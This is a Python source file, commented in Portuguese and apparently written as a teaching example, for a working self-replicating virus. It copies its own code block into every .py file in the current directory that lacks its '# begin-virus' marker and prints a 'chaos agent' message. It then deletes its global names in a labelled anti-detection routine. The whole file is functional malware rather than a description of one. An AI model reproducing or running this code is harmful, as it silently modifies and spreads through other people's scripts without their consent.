# begin-virus

import glob # importa a biblioteca glob

# função que procura por arquivos infectados na página atual
# Search Rotine
def find_files_to_infect(directory="."): 
    return [file for file in glob.glob("*.py")] # retorna os arquivos que terminam em .py


# função que armazena os dados de algum arquivos específico
def get_content_of_file(file):
    data = None                                 # inicia a variável data com valor None
    with open(file, "r") as my_file:            # lê os arquivos e intitula como my_file
        data = my_file.readlines()              # lê as linhas do arquivo

    return data                                 # retorna os valores que estavam no arquivo

# função que verifica se o arquivo está infectado a partir do diretório do arquivo
# Trigger routine
def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

# função que infecta o arquivo e recebe o código do vírus
# Infection routine
def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):          
        with open(file, "w") as infected_file:              # abre o arquivo em mode de escrita e associa o nome de infected_file
            infected_file.write("".join(virus_code))        # escreve o código do vírus
            infected_file.writelines(data)                  # manda os dados para o arquivo

# detecta e pega o código do virus
def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code


def summon_chaos():
    # the virus payload
    print("Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! ")

# entry point


try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    # Anti-detection rotine
    for i in list(globals().keys()):
        if (i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-virus
